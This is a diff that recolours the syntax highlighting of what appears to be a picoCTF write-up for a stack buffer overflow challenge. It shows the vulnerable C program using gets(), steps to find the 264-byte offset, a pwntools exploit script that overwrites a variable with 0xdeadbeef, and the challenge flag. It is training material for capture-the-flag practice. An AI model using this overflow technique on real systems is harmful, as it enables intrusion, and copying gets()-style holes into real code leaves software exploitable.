@@ -74,30 +74,30 @@
 -No Hints</p>
 <hr>
 <h2 id="source-code">Source Code</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SIZE 256
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define GOAL 0xdeadbeef
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define SIZE 256
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define GOAL 0xdeadbeef
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span> 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> code <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> clutter[SIZE];
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdin, NULL);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;My room is so cluttered...&#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;What do you see?&#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(clutter);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (code <span style="color:#f92672">==</span> GOAL) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;code == 0x%llx: how did that happen??</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GOAL);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;take a flag for your troubles&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>);
-</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;code == 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, code);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;code != 0x%llx :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GOAL);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">long</span> code <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> clutter[SIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setbuf</span>(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setbuf</span>(stdin, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setbuf</span>(stderr, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;My room is so cluttered...&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;What do you see?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">gets</span>(clutter);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (code <span style="color:#ff79c6">==</span> GOAL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;code == 0x%llx: how did that happen??</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, GOAL);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;take a flag for your troubles&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;cat flag.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;code == 0x%llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, code);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;code != 0x%llx :(</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, GOAL);
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <h2 id="goal">Goal</h2>
@@ -109,38 +109,38 @@
 <hr>
 <h2 id="find-the-offset-of-code-relative-to-rbp">Find the Offset of <code>code</code> Relative to RBP</h2>
 <p>Run <code>objdump</code> to disassemble the binary:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -d ./chall
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -d ./chall
 </span></span></code></pre></div><p>In the output you can find:</p>
 <pre tabindex="0"><code>400756: 48 39 45 f8    cmp %rax,-0x8(%rbp)
 </code></pre><p>This tells us that <code>code</code> is located <strong>8 bytes below RBP</strong>.</p>
 <hr>
 <h2 id="find-the-offset-from-input-to-code">Find the Offset from Input to <code>code</code></h2>
 <p>Generate a non repeating cyclic pattern of 300 bytes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic <span style="color:#ae81ff">300</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic <span style="color:#bd93f9">300</span>
 </span></span></code></pre></div><p>Run the binary in <strong>pwndbg</strong> with this pattern as input. After the crash, check the RBP value:</p>
 <pre tabindex="0"><code>RBP  0x626161616161616a (&#39;jaaaaaab&#39;)
 </code></pre><p>Copy the RBP value and use <code>cyclic -l</code> to find the offset:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic -l 0x626161616161616a
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Found at offset 272</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic -l 0x626161616161616a
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Found at offset 272</span>
 </span></span></code></pre></div><p>Since <code>code</code> is 8 bytes below RBP:</p>
 <pre tabindex="0"><code>Final offset = 272 - 8 = 264
 </code></pre><hr>
 <h2 id="payload">Payload</h2>
 <p>After the <strong>264 bytes</strong> we just need to put <code>0xdeadbeef</code> in little endian to overwrite the <code>code</code> var.</p>
 <h3 id="python-script">Python Script</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mars.picoctf.net&#34;</span>
-</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#75715e"># Enter your Port</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;mars.picoctf.net&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#ff79c6">=</span> <span style="color:#6272a4"># Enter your Port</span>
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> remote(HOST, PORT)
-</span></span><span style="display:flex;"><span>m<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;What do you see?&#34;</span>)
+</span></span><span style="display:flex;"><span>m <span style="color:#ff79c6">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>m<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;What do you see?&#34;</span>)
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">264</span> <span style="color:#f92672">+</span> win
+</span></span><span style="display:flex;"><span>win <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xef\xbe\xad\xde</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">264</span> <span style="color:#ff79c6">+</span> win
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>m<span style="color:#f92672">.</span>sendline(payload)
-</span></span><span style="display:flex;"><span>m<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>m<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>m<span style="color:#ff79c6">.</span>interactive()
 </span></span></code></pre></div><hr>
 <h2 id="flag">Flag</h2>
 <pre tabindex="0"><code>picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
